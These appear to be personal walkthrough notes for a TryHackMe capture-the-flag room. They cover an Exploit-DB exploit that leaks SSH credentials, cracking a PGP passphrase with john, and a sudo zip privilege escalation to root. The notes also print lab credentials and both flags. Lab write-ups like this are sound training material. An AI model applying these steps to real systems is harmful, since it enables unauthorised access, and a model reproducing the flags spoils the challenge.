# Initial foothold

Use exploit:
https://www.exploit-db.com/exploits/48143

```bash
python2 48143.py 10.10.161.58
```
=> skyfuck:8730281lkjlkjdqlksalks

ssh login with creds

User flag:
```bash
cat /home/merlin/user.txt 
THM{GhostCat_1s_so_cr4sy}
```

# PrivEsc

Users:
- skyfuck
- merlin

Home directory files:
- `credential.pgp`
- `tryhackme.asc`

Decrypt `credential.pgp`:
```bash
gpg --import tryhackme.asc
gpg --output out.txt --decrypt credential.pgp
```
=> Need a passphrase

Path variable:
![[Pasted image 20240505181133.png]]

Cron jobs:
![[Pasted image 20240505181634.png]]

==DEAD END==

Download:
- `credential.pgp`
- `tryhackme.asc`

Run gpg2john on PGP symmetrically encrypted files (.gpg / .asc)
```bash
gpg2john tryhackme.asc > hash.txt
```

Crack hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20240505190935.png]]
=> alexandru

Use password to decrypt `credential.pgp`:
```bash
gpg --import tryhackme.asc
gpg --output out.txt --decrypt credential.pgp
```

=> `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

Login SSH as merlin.

Check sudo privs:
![[Pasted image 20240505191153.png]]

GTFObins 4 the win https://gtfobins.github.io/gtfobins/zip/#sudo:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Root Flag:
```bash
cat /root/root.txt
THM{Z1P_1S_FAKE}
```